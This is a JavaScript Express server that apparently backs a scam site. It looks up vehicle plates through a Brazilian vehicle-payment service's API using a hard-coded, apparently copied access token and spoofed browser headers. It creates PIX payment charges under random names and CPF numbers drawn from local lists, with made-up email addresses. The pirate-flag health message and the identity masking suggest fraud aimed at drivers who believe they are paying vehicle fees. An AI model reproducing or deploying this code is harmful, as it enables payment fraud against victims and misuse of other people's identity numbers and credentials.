import express from 'express'
import axios from 'axios'
import cors from 'cors'
import dotenv from 'dotenv';
import { v4 as uuidv4 } from 'uuid';
import data from './data/names.json' with { type: 'json' };
import cpfData from './data/cpfs.json' with { type: 'json' };
dotenv.config()



const app = express()

const corsOptions = {
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type']
};

app.use(cors(corsOptions));
app.use(express.json())
const plate = "hml1014"



const searchPlate = async (plate) => {



    const response = await fetch(`https://zpy-customer-communication-ecommerce-bff.usezapay.com.br/api/v1/vehicle/${plate}`, {
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHBpcmVfYXQiOjIwNzM2MDA2MjMuNDAwMDQzLCJ1c2VyX2lkIjoiNzUwNTU5OCIsImF1ZCI6IkpGVlBKdTBIQzNhM1JJeG9BMTVXYXRHeUpkSDk3QmdpIiwiaXNzIjoiaHR0cDpsb2NhbGhvc3Q6ODAwMC8iLCJpYXQiOjE3NzM2MDA2MjMuNDAwMDIyLCJqdGkiOiJOb25lIn0.9JXl1c9WRyYFydlKOFcG5ECC5M0Vu3Gzip96b73H2e8",
            "priority": "u=1, i",
            "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "test_refresh_token": "true"
        },
        "referrer": "https://app.usezapay.com.br/",
        "body": null,
        "method": "GET",
        "mode": "cors",
        "credentials": "include"
    });

    const data = await response.json()
    return data;

}


app.get('/api/vehicle-lookup', async (req, res) => {


    console.log("💻 acessando rota /vehicle-lookup...")
    const { plate } = req.query
    const response = await searchPlate(plate)
    return res.status(200).json(response)


})


app.post('/api/create/payment', async (req, res) => {
    try {

        const name = searchNames();
        const cpf = searchCpfs()

        const { amount } = req.body

        const formattedEmail = `${name.toLowerCase().replace(/\s+/g, '.')}@gmail.com`


        const pixData = {
            "identifier": uuidv4(),
            "amount": amount,
            "client": {
                "name": name,
                "email": formattedEmail,
                "phone": '19998954120',
                "document": cpf
            },
            "products": [
                {
                    "id": "cmmtpsl2a14881ypeippowsyh",
                    "name": "Flow",
                    "quantity": 1,
                    "price": amount
                }
            ]
        }
        const response = await axios.post('https://app.sigilopay.com.br/api/v1/gateway/pix/receive',
            pixData,
            {
                headers: {
                    'x-public-key': process.env.PUBLIC_KEY,
                    'x-secret-key': process.env.SECRET_KEY,
                    'Content-Type': 'application/json'
                },
            });

        console.log(response.data)
        return res.json({ data: response.data, success: true })


    } catch (error) {
        console.log(error.response.data)

    }
})


app.get('/api/verify-status/:id', async (req, res) => {
    try {


        const { id } = req.params;
        const response = await axios.get(`https://app.sigilopay.com.br/api/v1/gateway/transactions?id=${id}`,
            {
                headers: {
                    'x-public-key': process.env.PUBLIC_KEY,
                    'x-secret-key': process.env.SECRET_KEY,
                    'Content-Type': 'application/json'
                },
            }
        )

        return res.json(response.data.status)
    } catch (error) {

    }
})

const searchNames = () => {
    const nomes = data.nomes
    const randomName = nomes[Math.floor(Math.random() * nomes.length)];

    return randomName;
}

const searchCpfs = () => {
    const cpfs = cpfData.cpfs;
    const randomCpf = cpfs[Math.floor(Math.random() * cpfs.length)]

    return randomCpf;
}


app.get('/api/healthy', (res, res) => {
    return res.status(200).json({ message: "✅🏴‍☠️🏴‍☠️ API IS UP AND WORKING.." })
})

const PORT = process.env.PORT || 5004;


app.listen(PORT, () => {
    console.log("Server is running....")
})